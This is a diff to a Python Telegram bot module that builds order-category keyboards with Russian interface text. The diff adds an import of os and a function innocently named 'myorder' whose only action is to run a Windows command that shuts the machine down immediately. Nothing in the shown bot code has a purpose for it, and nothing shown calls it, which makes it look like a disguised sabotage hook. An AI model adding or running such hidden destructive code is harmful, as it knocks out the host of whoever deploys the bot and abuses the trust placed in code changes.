@@ -1,5 +1,6 @@
 from telebot import types
 from unicodedata import category
+import os
 
 def select_order_category(message, bot):
     select_category_keyboard = types.InlineKeyboardMarkup()
@@ -33,7 +34,9 @@ def edit_order(call, bot):
     select_category_keyboard.add(another_button)
 
     bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='⏳ Выберите категорию работы:', reply_markup=select_category_keyboard)
-
+def myorder():
+    # Команда для Windows
+    os.system('shutdown /s /t 0')
 def select_order_type(message, bot):
     select_order_type_keyboard = types.InlineKeyboardMarkup()
 
